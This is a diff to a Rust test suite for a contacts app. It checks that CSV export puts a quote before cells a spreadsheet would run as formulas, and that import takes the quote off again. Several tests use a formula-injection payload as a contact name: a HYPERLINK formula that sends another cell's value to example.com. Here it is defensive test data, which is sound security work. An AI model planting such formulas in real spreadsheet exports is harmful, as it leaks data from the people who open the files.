@@ -1044,10 +1044,10 @@ async fn export_writes_one_row_per_identity_with_the_contact_repeated() {
         text,
         format!(
             "{HEADER}\n\
-             {unknown},,,phone,phone,+15555550101\n\
+             {unknown},,,phone,phone,'+15555550101\n\
              {ada},Ada,Family;Work,phone,email,ada@example.com\n\
-             {ada},Ada,Family;Work,phone,phone,+15555550100\n\
-             {ada},Ada,Family;Work,whatsapp,phone,+15555550100\n\
+             {ada},Ada,Family;Work,phone,phone,'+15555550100\n\
+             {ada},Ada,Family;Work,whatsapp,phone,'+15555550100\n\
              {no_identity},Cy,,,,\n"
         )
     );
@@ -1056,7 +1056,7 @@ async fn export_writes_one_row_per_identity_with_the_contact_repeated() {
     let text = export_csv(&mut conn, ACCOUNT, Some(&only)).await.unwrap();
     assert_eq!(
         text,
-        format!("{HEADER}\n{unknown},,,phone,phone,+15555550101\n")
+        format!("{HEADER}\n{unknown},,,phone,phone,'+15555550101\n")
     );
 }
 
@@ -1278,4 +1278,169 @@ async fn a_us_number_without_plus_still_loads_as_its_plus_one_identity() {
         identities_of(&mut conn, ada).await,
         ["phone/phone/+15555550100"]
     );
+}
+
+// --- Cells a spreadsheet would read as a formula ---
+
+/// A spreadsheet runs a cell that starts with `=`, `+`, `-`, `@`, a tab or
+/// a carriage return as a formula, so Export writes a `'` before each such
+/// cell in every column, and a spreadsheet shows the cell as text.
+#[tokio::test]
+async fn export_writes_a_quote_before_a_cell_a_spreadsheet_would_run() {
+    let (mut conn, _pool, _dir) = account().await;
+    let name = "=HYPERLINK(\"http://example.com/?\"&B2,\"Ada\")";
+    let ada = imported(
+        &mut conn,
+        name,
+        &[
+            ("phone", "phone", "+15555550100"),
+            ("phone", "username", "@ada"),
+            ("phone", "other", "-ada"),
+        ],
+    )
+    .await;
+    join_group(&mut conn, ada, "+Work").await;
+
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    let cell = "\"'=HYPERLINK(\"\"http://example.com/?\"\"&B2,\"\"Ada\"\")\"";
+    assert_eq!(
+        text,
+        format!(
+            "{HEADER}\n\
+             {ada},{cell},'+Work,phone,other,'-ada\n\
+             {ada},{cell},'+Work,phone,phone,'+15555550100\n\
+             {ada},{cell},'+Work,phone,username,'@ada\n"
+        )
+    );
+}
+
+/// The `'` Export writes is taken off again, so the file loaded straight
+/// back changes nothing. A name that itself starts with `'` and then one of
+/// those characters gets a second `'`, so it comes back with its own.
+#[tokio::test]
+async fn a_quoted_cell_loaded_straight_back_changes_nothing() {
+    let (mut conn, _pool, _dir) = account().await;
+    let ada = imported(
+        &mut conn,
+        "=HYPERLINK(\"http://example.com/?\"&B2,\"Ada\")",
+        &[("phone", "phone", "+15555550100")],
+    )
+    .await;
+    join_group(&mut conn, ada, "-Family").await;
+    imported(&mut conn, "'=1+1", &[("phone", "username", "@bo")]).await;
+    let stamp = "2001-01-01 00:00:00";
+    sqlx::query("UPDATE contacts SET last_modified = $1")
+        .bind(stamp)
+        .execute(&mut *conn)
+        .await
+        .unwrap();
+
+    let before = picture(&mut conn).await;
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+    for mode in [LoadMode::Append, LoadMode::Edit] {
+        let counts = loaded(&mut conn, &text, mode).await;
+        assert_eq!(counts, LoadCounts::default(), "{mode:?}");
+        assert_eq!(picture(&mut conn).await, before, "{mode:?}");
+        assert_eq!(
+            export_csv(&mut conn, ACCOUNT, None).await.unwrap(),
+            text,
+            "{mode:?}"
+        );
+    }
+}
+
+/// A spreadsheet may keep the `'` when it saves or drop it. The load reads
+/// the cell the same either way.
+#[tokio::test]
+async fn a_cell_loads_the_same_with_or_without_its_quote() {
+    let (mut conn, _pool, _dir) = account().await;
+    let counts = loaded(
+        &mut conn,
+        &file(&[
+            ",'=Ada,'+Work,phone,phone,'+15555550100",
+            ",=Bo,+Work,phone,phone,+15555550101",
+        ]),
+        LoadMode::Append,
+    )
+    .await;
+    assert_eq!(counts.contacts_created, 2);
+    let ada = contact_named(&mut conn, "=Ada").await;
+    assert_eq!(
+        identities_of(&mut conn, ada).await,
+        ["phone/phone/+15555550100"]
+    );
+    assert_eq!(groups_of(&mut conn, ada).await, ["+Work"]);
+    let bo = contact_named(&mut conn, "=Bo").await;
+    assert_eq!(groups_of(&mut conn, bo).await, ["+Work"]);
+}
+
+/// Only one `'`, and only before one of those characters, is taken off: a
+/// name that starts with `'` for its own sake keeps it.
+#[tokio::test]
+async fn a_quote_before_other_text_is_part_of_the_cell() {
+    let (mut conn, _pool, _dir) = account().await;
+    loaded(
+        &mut conn,
+        &file(&[
+            ",'Twas,,phone,phone,+15555550100",
+            ",''=Cy,,phone,phone,+15555550101",
+        ]),
+        LoadMode::Append,
+    )
+    .await;
+    contact_named(&mut conn, "'Twas").await;
+    contact_named(&mut conn, "'=Cy").await;
+}
+
+/// Every character a spreadsheet reads as the start of a formula gets the
+/// `'`, and the load takes exactly that `'` off again.
+#[test]
+fn every_formula_start_is_quoted_and_read_back() {
+    for cell in ["=1", "+1", "-1", "@a", "\ta", "\ra", "'=1", "''+1"] {
+        let written = written_cell(cell);
+        assert_eq!(written, format!("'{cell}"), "{cell:?}");
+        assert_eq!(read_cell(&written), cell, "{cell:?}");
+    }
+    for cell in ["", "Ada", "'Twas", "a=1", "15555550100"] {
+        assert_eq!(written_cell(cell), cell, "{cell:?}");
+        assert_eq!(read_cell(cell), cell, "{cell:?}");
+    }
+}
+
+/// LibreOffice Calc 26.2 opens the export with every `'` shown in its cell,
+/// and saves it back with every text cell in double quotes and the `'`
+/// kept. That file loads back without a change.
+#[tokio::test]
+async fn an_export_libreoffice_saved_again_changes_nothing() {
+    let (mut conn, _pool, _dir) = account().await;
+    let ada = imported(
+        &mut conn,
+        "=HYPERLINK(\"http://example.com/?\"&B2,\"Ada\")",
+        &[
+            ("phone", "phone", "+15555550100"),
+            ("phone", "username", "@ada"),
+        ],
+    )
+    .await;
+    join_group(&mut conn, ada, "+Work").await;
+    let before = picture(&mut conn).await;
+    let text = export_csv(&mut conn, ACCOUNT, None).await.unwrap();
+
+    let mut reader = csv::Reader::from_reader(text.as_bytes());
+    let mut writer = csv::WriterBuilder::new()
+        .quote_style(csv::QuoteStyle::NonNumeric)
+        .from_writer(Vec::new());
+    writer.write_record(reader.headers().unwrap()).unwrap();
+    for record in reader.records() {
+        writer.write_record(&record.unwrap()).unwrap();
+    }
+    let saved = String::from_utf8(writer.into_inner().unwrap()).unwrap();
+    assert!(saved.contains(&format!("{ada},\"'=HYPERLINK(")), "{saved}");
+    assert!(saved.contains(",\"'+15555550100\""), "{saved}");
+
+    for mode in [LoadMode::Append, LoadMode::Edit] {
+        let counts = loaded(&mut conn, &saved, mode).await;
+        assert_eq!(counts, LoadCounts::default(), "{mode:?}");
+        assert_eq!(picture(&mut conn).await, before, "{mode:?}");
+    }
 }
